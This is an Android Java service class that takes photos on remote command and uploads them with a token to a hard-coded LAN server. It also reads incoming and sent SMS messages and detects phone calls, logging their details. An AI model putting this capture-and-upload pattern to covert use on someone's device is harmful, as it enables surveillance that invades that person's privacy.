package com.internetruntime.androidclient.DeviceManager;

import java.io.File;

import com.internetruntime.androidclient.Communication.HttpDriver;

import android.app.Activity;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.util.Log;

public class DeviceManager extends Service{
	private Context context;
	
	private Uri picUri;
	private String token;
	private int reqWidth;
	private int reqHeight;
	
	public DeviceManager(Context context) {
		this.context = context;
	}
		
	public void handlePicture()
	{
		PicCompresser compresser = new PicCompresser(picUri);
		Log.d("comm", "get Pic!");
		File pic = compresser.getCompressedPic(reqWidth, reqHeight);
		
		HttpDriver httpDriver = new HttpDriver("http://192.168.3.160:9003/upload?token=" + token);
		httpDriver.postFile(token, pic);
	}
	
	public void takePicture(String token, int reqWidth, int reqHeight)
	{
		this.token = token;
		this.reqWidth = reqWidth;
		this.reqHeight = reqHeight;
		CameraDriver cameraDriver = new CameraDriver(context);
		this.picUri = cameraDriver.takePicture();		
	}
	
	
	//new picture
	public boolean NewPicHandler(Intent intent) {
		
		return true;
	}
	
	//new video	
	public boolean NewVideoHandler(Intent intent) {
		
		return true;
	}
	
	public boolean SMSRcvHandler(Intent intent) {
		Log.d("tag", "sms handler in");
		Bundle bundle = intent.getExtras();
		Object[] pdus = (Object[])bundle.get("pdus");
		Object pdu = pdus[0];
		SmsMessage msg = SmsMessage.createFromPdu((byte[])pdu);
		String SMSAction = intent.getAction();
		String SMSsender = msg.getOriginatingAddress();
		String SMSbody = msg.getMessageBody();
		Log.d("tag", "sms action: " + SMSAction);
		Log.d("tag", "sms sender: " + SMSsender);
		Log.d("tag", "sms body: " + SMSbody);
		return true;
	}
	
	public boolean SMSSndHandler(ContentResolver cr) {
		
		
		Log.d("tag", "flag1");
		Log.d("tag", cr.toString());
		Log.d("tag", "flag2");
		Cursor cursor = cr.query(
				Uri.parse("content://sms/outbox"), null, null, null, null);
		Log.d("tag", "flag3");
		if (cursor.moveToFirst()) {
			String SMSAction = "SMS_SEND";
			String SMSreceriver = cursor.getString(cursor
					.getColumnIndex("address"));
			String SMSbody = cursor.getString(cursor.getColumnIndex("body"));
			String SMSDate = cursor.getString(cursor.getColumnIndex("date"));
			Log.d("tag", "sms action: " + SMSAction);
			Log.d("tag", "sms receriver: " + SMSreceriver);
			Log.d("tag", "sms body: " + SMSbody);
			Log.d("tag", "sms date: " + SMSDate);

		}
		return true;
	}
	
	public boolean PhoneManager(Intent intent) {
		
		if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL))
		{
			Log.d("tag", "new out-going call");
		}
		else
		{
			Log.d("tag", "new in-going call");
		}
		return true;
	}



	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}
